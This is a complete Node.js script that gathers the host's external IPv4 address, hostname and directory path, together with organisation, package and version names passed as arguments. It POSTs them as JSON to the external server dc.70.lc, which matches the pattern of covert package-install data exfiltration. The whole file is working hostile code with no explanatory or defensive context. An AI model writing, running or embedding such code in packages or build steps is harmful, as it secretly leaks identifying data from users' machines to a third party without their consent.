const os = require('os');
const https = require('https');

var __dirname;

const ip = [].concat(...Object.values(os.networkInterfaces()))
    .filter(({ family, internal }) => family === "IPv4" && !internal)
    .map(({ address }) => address)[0];

const host = os.hostname()
const path = __dirname;
const org = process.argv.slice(2)[0]
const package = process.argv.slice(2)[1]
const version = process.argv.slice(2)[2]

data = {
    ip,
    host,
    path,
    org,
    package,
    version
}

body = JSON.stringify(data)

var r = https.request({
    hostname:'dc.70.lc',
    port: 443,
    path: '/d',
    method: 'POST',
    headers: {
        'Content-Length': body.length,
        'Content-Type': 'application/json'
    }
})
r.write(body)
r.end()

